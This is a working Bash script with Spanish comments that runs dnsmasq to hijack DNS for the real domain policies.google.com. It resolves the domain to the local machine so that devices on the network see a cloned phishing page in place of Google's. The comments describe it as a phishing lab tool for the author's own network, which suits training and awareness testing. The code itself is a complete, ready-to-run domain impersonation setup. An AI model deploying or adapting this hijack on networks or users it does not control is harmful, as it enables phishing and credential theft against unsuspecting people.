#!/usr/bin/env bash
# DNS hijack del laboratorio (solo red propia).
#
# Levanta un dnsmasq en esta máquina que resuelve el dominio REAL
# policies.google.com hacia la IP de LAN de este equipo. Así, cualquier
# dispositivo de la red de pruebas cuyo DNS apunte a esta máquina verá el
# CLON en vez de la página real de Google.
#
#   ./dns.sh up      -> arranca dnsmasq (pide sudo)
#   ./dns.sh down    -> lo para
#   ./dns.sh status  -> muestra estado y la regla activa
#
# El dominio real se redirige solo DENTRO de tu red: en el resto del mundo
# policies.google.com sigue resolviendo a Google. Nunca uses esto fuera de
# una red y dispositivos que controles.
set -euo pipefail
cd "$(dirname "$0")"

LAN_IFACE="$(ip route | awk '/default/ {print $5; exit}')"
LAN_IP="$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}' || true)"

CONF_FILE="$PWD/dnsmasq.conf"
PID_FILE="/tmp/dnsmasq-phishing.pid"

gen_conf() {
  cat > "$CONF_FILE" <<EOF
# Generado por dns.sh — laboratorio de phishing, solo red propia.
# NO usar fuera de una red controlada.
interface=$LAN_IFACE
bind-interfaces
listen-address=$LAN_IP
no-resolv
# El resto del tráfico DNS va al resolver de Cloudflare (o el que prefieras)
server=1.1.1.1
server=8.8.8.8
# Hijack del dominio real hacia el clon local
address=/policies.google.com/$LAN_IP
address=/www.policies.google.com/$LAN_IP
EOF
  echo "config escrito en $CONF_FILE (interface=$LAN_IFACE, ip=$LAN_IP)"
}

case "${1:-status}" in
  up)
    [ -n "$LAN_IP" ] || { echo "no se pudo detectar la IP de LAN"; exit 1; }
    gen_conf
    echo "arrancando dnsmasq (sudo)..."
    sudo dnsmasq --conf-file="$CONF_FILE" --pid-file="$PID_FILE" \
      --log-facility=- --no-daemon 2>/dev/null &
    # dnsmasq con --no-daemon y & no escribe pid-file correctamente; usamos pgrep
    sleep 1
    echo "dnsmasq en marcha. Clientes de prueba: apuntad su DNS a $LAN_IP"
    ;;
  down)
    sudo pkill -f "dnsmasq.*dnsmasq-phishing" 2>/dev/null \
      || sudo pkill dnsmasq 2>/dev/null \
      || echo "dnsmasq ya estaba parado"
    rm -f "$PID_FILE"
    echo "dnsmasq parado"
    ;;
  status)
    if pgrep -f "dnsmasq.*phishing" >/dev/null 2>&1 || [ -f "$PID_FILE" ]; then
      echo "dnsmasq activo — policies.google.com -> $LAN_IP"
    else
      echo "dnsmasq parado"
    fi
    ;;
  *)
    echo "uso: $0 {up|down|status}"; exit 1 ;;
esac
